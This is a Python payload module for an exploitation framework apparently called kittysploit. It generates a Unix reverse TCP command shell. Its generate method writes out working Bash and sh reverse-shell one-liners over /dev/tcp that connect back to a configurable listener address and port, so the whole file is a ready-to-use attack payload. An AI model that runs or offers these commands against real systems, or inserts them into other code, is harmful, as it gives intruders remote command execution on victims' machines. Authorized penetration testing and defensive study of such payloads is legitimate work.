from kittysploit import *


class Module(Payload):
	
	__info__ = {
		'name': 'Unix Command Shell, Reverse TCP (via Bash)',
		'description': 'Connect back and create a command shell via Bash /dev/tcp',
		'category': PayloadCategory.CMD,
		'platform': Platform.UNIX,
		'listener': 'listeners/multi/reverse_tcp',
		'handler': Handler.REVERSE
	}

	lhost = OptString('127.0.0.1', 'Connect to IP address', True)
	lport = OptPort(4444, 'Connect to port', True)
	encoder = OptString("", "Encoder", False, True)
	shell_binary = OptChoice('bash', 'The system shell in use [bash, sh]', True, choices=['bash', 'sh'])

	def generate(self):
		"""Generate bash reverse TCP payload using /dev/tcp"""
		# shell_binary now returns the value directly (e.g., 'bash' or 'sh')
		if self.shell_binary == 'bash':
			# Bash version with exec for better reliability
			payload = f"bash -c 'exec 5<>/dev/tcp/{self.lhost}/{self.lport};cat <&5 | while read line; do $line 2>&5 >&5; done'"
		else:
			# Sh version (simpler, works on systems without bash)
			payload = f"sh -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1"
		
		return payload
